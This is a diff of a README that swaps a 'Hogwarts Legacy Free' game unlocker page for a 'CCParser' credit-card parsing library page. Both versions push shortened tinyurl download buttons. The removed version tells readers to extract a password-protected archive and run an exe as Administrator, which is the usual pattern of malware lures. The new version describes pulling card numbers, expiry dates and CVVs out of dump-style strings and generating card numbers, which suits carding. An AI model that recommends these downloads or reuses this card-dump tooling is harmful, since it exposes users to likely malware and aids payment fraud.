@@ -1,232 +1,142 @@
-# 🧙 Hogwarts Legacy Free — Unlock Full Game Experience [Free] 2026
-
+# 🎯 CCParser – A Robust Library for Credit Card Parsing and Validation
 ![Downloads](https://img.shields.io/badge/Downloads-95K+-blue?style=for-the-badge&logo=github)
 ![User Rating](https://img.shields.io/badge/User%20Rating-4.6/5-gold?style=for-the-badge&logo=star)
 ![Latest Version](https://img.shields.io/badge/Latest%20Version-2.1.0-green?style=for-the-badge&logo=github)
-![Platform](https://img.shields.io/badge/Supported-Windows%2010%20%7C%2011%20%7C%20Steam%20%7C%20Epic%20Games-informational?style=for-the-badge&logo=steam)
 
-The **🧙 Hogwarts Legacy Free** is a comprehensive unlocker and enhancer for Hogwarts Legacy, the immersive open-world RPG set in the Wizarding World. This tool unlocks all spells, talents, cosmetics, brooms, and magical beasts — completely free. Whether you want to master every spell without grinding, unlock rare cosmetics, or access all areas of Hogwarts, Hogwarts Legacy Free delivers the **complete magical experience** with **zero microtransactions**.
+**PyPI**  
+**License**  
+**Build Status**
 
-<div align="center">
-
-[![Download Hogwarts Legacy Free](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/hogwarts-legacy-free)
-
-</div>
 
 <div align="center">
-<img width="1280" height="720" alt="maxresdefault (2)" src="https://github.com/user-attachments/assets/a7063451-52ce-4f6f-a6d9-4d064675e95d" />
+
+[![Download CC Parser Free](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/ccparser-card)
 
 </div>
+ 
+CCParser is a powerful and efficient Python library designed for seamless parsing, validation, and formatting of credit card information. It can extract card details from both well-formatted, delimited strings and unstructured real-world text, all while offering a straightforward and consistent API.
 
----
+🎯 **Key Features**
 
-## 🎯 The Problem
+- Intelligent extraction of card number, expiration date, and CVV from a variety of formats
+- Heuristic parsing of noisy input (including labels, inconsistent delimiters, and surrounding text)
+- CVV length verification at parse time (supports 3 or 4 digits)
+- Luhn algorithm validation and expiration date checking
+- CVV validation that accounts for card type
+- Detection of over 20 major card networks
+- Formatting and masking utilities
+- Command-line interface (CLI) for quick parsing and validation
 
-Hogwarts Legacy is amazing, but unlocking everything takes forever. Spells require quests. Talents need levels. Cosmetics are locked. You want to experience everything the game offers without spending 100+ hours grinding.
+**Disclaimer**  
+This library is intended solely for educational and lawful purposes.
 
-## 💡 The Solution
+CCParser is meant to assist developers with:
 
-**Hogwarts Legacy Free** unlocks all game content instantly. All spells, talents, cosmetics, and areas — one click.
+- Developing payment processing systems
+- Testing and validating payment integrations
+- Learning about payment card industry standards
+- Building fraud detection and prevention tools
 
-- ✅ **All spells unlocked** — every spell from all talent trees
-- ✅ **All talents unlocked** — full talent specialization
-- ✅ **All cosmetics** — every robe, wand, and accessory
-- ✅ **All brooms** — fastest brooms available
-- ✅ **All magical beasts** — complete vivarium collection
-- ✅ **All areas unlocked** — explore every location
-- ✅ **100% free** — no microtransactions, no grinding
+Prohibited uses include:
 
----
+- Unauthorized access to financial systems or data
+- Credit card fraud, carding, or any financial crime
+- Collecting, storing, or processing stolen card information
+- Any activity that violates relevant laws or regulations
 
-## ⚙️ What You Get
+By using this library, you agree to follow all applicable laws, including PCI-DSS standards, and you assume full responsibility for how you use this software. The authors are not liable for any misuse or illegal activities carried out with this tool.
 
-### Unlock Features
+If you suspect fraud, please report it to your local authorities.
 
-| Feature | What It Does |
-|---------|--------------|
-| **🔮 All Spells** | All 30+ spells including Unforgivable Curses |
-| **⭐ All Talents** | Complete talent trees (all 5 categories) |
-| **👘 All Cosmetics** | Every robe, outfit, wand handle |
-| **🧹 All Brooms** | All 15+ brooms including fastest |
-| **🦄 All Beasts** | Every magical beast for vivarium |
-| **🗺️ All Areas** | All floo flames unlocked |
+**Supported Card Networks**  
+CCParser recognizes and validates the following card types:
 
-### Game Support
+- AMEX  
+- Dankort  
+- Diners Club  
+- Discover  
+- Elo  
+- Humo  
+- InstaPayment  
+- InterPayment  
+- JCB  
+- LankaPay  
+- Maestro  
+- MasterCard  
+- Mir  
+- Troy  
+- UATP  
+- UnionPay  
+- UzCard  
+- Verve  
+- Visa  
+- Visa Electron  
 
-| Platform | Support |
-|----------|---------|
-| **Steam** | ✅ Full support |
-| **Epic Games** | ✅ Full support |
-| **PC (Any)** | ✅ Works with all versions |
-| **Offline Mode** | ✅ Supported |
-
-### What's Included
-
-| Category | Items |
-|----------|-------|
-| **Spells** | All 30+ spells including Avada Kedavra, Crucio, Imperio |
-| **Talents** | Core, Spells, Dark Arts, Stealth, Room of Requirement |
-| **Cosmetics** | 100+ robes, outfits, gloves, masks, hats, glasses |
-| **Wands** | All wand handles and styles |
-| **Brooms** | All 15+ brooms including Silver Arrow |
-| **Beasts** | All 13 magical beasts |
-| **Conjurations** | All vivarium and Room of Requirement items |
-
----
-
-## 📊 Before & After
-
-| Metric | Normal Game | With Hogwarts Legacy Free |
-|--------|-------------|--------------------------|
-| **Spells Available** | Unlock over 30+ hours | ✅ All instantly |
-| **Talents** | Level 40 required | ✅ All unlocked |
-| **Cosmetics** | Grind or purchase | ✅ All owned |
-| **Brooms** | Quests required | ✅ All available |
-| **Areas** | Progressive unlock | ✅ Fully open |
-| **Time to Max** | 60-100 hours | ✅ 5 seconds |
-
----
-
-## 🛠️ How to Use
-
-### Installation
-
-1. **🧙 Download** from the button below
-2. **📦 Extract the archive** — password `2026`
-3. **🎮 Launch Hogwarts Legacy** — start the game first
-4. **🖱️ Run as Administrator** — `HogwartsLegacyFree.exe`
-5. **✅ Click "Unlock All"** — wait 3-5 seconds
-6. **🎉 Check your game** — everything unlocked
-
-[![Download Hogwarts Legacy Free](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/hogwarts-legacy-free)
-
-### Main Interface
-
-```
-┌─────────────────────────────────────────────────────────────┐
-│  🧙 Hogwarts Legacy Free v2.1.0                             │
-├─────────────────────────────────────────────────────────────┤
-│                                                              │
-│  Detected: Hogwarts Legacy (Steam)                          │
-│  Status: Waiting for game...                                │
-│                                                              │
-│  ┌─────────────────────────────────────────────────────┐    │
-│  │  [ UNLOCK ALL ]                                      │    │
-│  │                                                      │    │
-│  │  [ Unlock Spells Only ]  [ Unlock Talents Only ]    │    │
-│  │  [ Unlock Cosmetics ]    [ Unlock Brooms/Beasts ]   │    │
-│  └─────────────────────────────────────────────────────┘    │
-│                                                              │
-│  Progress: Ready                                            │
-│                                                              │
-└─────────────────────────────────────────────────────────────┘
+**Installation**  
+```bash
+pip install ccparser
 ```
 
-### Quick Unlock (One Click)
+**Usage Examples**
 
-1. Click **"UNLOCK ALL"**
-2. Tool unlocks:
-   - All 30+ spells
-   - All talents (all categories)
-   - All cosmetics (100+ items)
-   - All brooms (15+)
-   - All magical beasts
-   - All conjurations
-3. Progress shows completion
-4. Check your game — everything unlocked
+*Supported Input Formats*  
+The library can handle many input styles, such as:
 
-### Selective Unlock
+- `4111111111111111|12/30|123`
+- `4111111111111111|12|2030|123`
+- `4111111111111111 12 2030 123`
+- `4111111111111111:12:2030:123`
+- `4111111111111111 2030/12 123`
+- `4111111111111111;12-30;123`
+- `4111 1111 1111 1111 12/30 123`
 
-| Button | What It Unlocks |
-|--------|-----------------|
-| **Unlock Spells Only** | All 30+ spells |
-| **Unlock Talents Only** | All talent points and trees |
-| **Unlock Cosmetics** | All robes, outfits, wands |
-| **Unlock Brooms/Beasts** | All brooms and magical beasts |
+And messy examples like:
 
-### How It Works
+```
+CC #: 4111111111111111
+Exp: 03/29
+CVV: 123
+```
 
-The tool modifies local save data to mark all items as "owned". This is client-side only and does not affect online features.
+*Python API Example*  
+```python
+from ccparser import CCParser
 
----
+card = CCParser("4111111111111111|12|2030|123")
+print(card.get_number())            # 4111111111111111
+print(card.get_formatted_number())  # 4111 1111 1111 1111
+print(card.get_expiry())            # 12/30
+print(card.get_cvv())               # 123
+print(card.is_valid())              # True
+print(card.get_card_type())         # Visa
+print(card.get_masked_number())     # **** **** **** 1111
+print(card.get_year())              # 2030
+print(card.get_month())             # 12
+```
 
-## 📥 System Requirements
+*Card Number Generation*  
+```python
+from ccparser.generator import generate_card_number
 
-| Component | Minimum |
-|-----------|---------|
-| **OS** | Windows 10 / 11 (64-bit) |
-| **Processor** | Any (Hogwarts Legacy compatible) |
-| **RAM** | 8 GB |
-| **Storage** | 15 MB |
-| **Game** | Hogwarts Legacy (Steam/Epic) |
-| **Admin Rights** | Required |
-| **Archive Password** | 2026 |
+print(generate_card_number("Visa"))
+print(generate_card_number("MasterCard"))
+```
 
-### Step-by-Step
+*CLI Usage*  
+```bash
+ccparser "4111111111111111|12|2030|123"
+ccparser --masked "4111111111111111|12|2030|123"
+ccparser --json "4111111111111111|12|2030|123"
+```
 
-1. Download from the link below
-2. Extract `.7z` (password: `2026`)
-3. Launch Hogwarts Legacy
-4. Run `HogwartsLegacyFree.exe` as Administrator
-5. Click "Unlock All"
-6. Enjoy your fully unlocked game
+**License**  
+This project is distributed under the MIT License. See the LICENSE file for details.
 
----
+**Contributing**  
+Contributions are welcome. Please review our CONTRIBUTING.md file before submitting a pull request.
 
-## 💡 Pro Tips
+**Acknowledgements**  
+- Luhn Algorithm  
+- Python regular expressions
 
-- **Launch game first** — tool needs game running
-- **Run as Administrator** — required for memory access
-- **Save before using** — backup your save just in case
-- **Works on existing saves** — no need to start over
-- **Single use** — unlocks persist across playthroughs
-
----
-
-## ❓ Frequently Asked Questions
-
-**Q: Is this safe?**  
-A: Yes — client-side save modification only.
-
-**Q: Will I get banned?**  
-A: Hogwarts Legacy is single-player. No bans reported.
-
-**Q: Does this work on Steam Deck?**  
-A: Yes — works on Windows on Steam Deck.
-
-**Q: Do I need to keep the tool running?**  
-A: No — one-time unlock. Changes persist.
-
-**Q: What is the archive password?**  
-A: `2026`
-
-**Q: Is it really free?**  
-A: Yes. No payments, no crypto miners, no remote access.
-
----
-
-## ☑️ Usage Guidelines
-
-- ☑️ For personal use only
-- ☑️ Purchase the game legally
-- ☑️ Use to enhance your experience
-- ☑️ Backup saves before using
-
----
-
-
-## 🏁 Final Word
-
-Every spell. Every talent. Every cosmetic. **Hogwarts Legacy Free** unlocks the complete magical experience — no grinding, no microtransactions, just magic.
-
-**One unlocker. Full wizardry. Zero cost.**
-
----
-
-<div align="center">
-
-[![Download Hogwarts Legacy Free](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/hogwarts-legacy-free)
-
-**Version 2.1.0** — Unlock full game experience. Free forever.
-
-</div>
+[![Download CC Parser Free](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/ccparser-card)
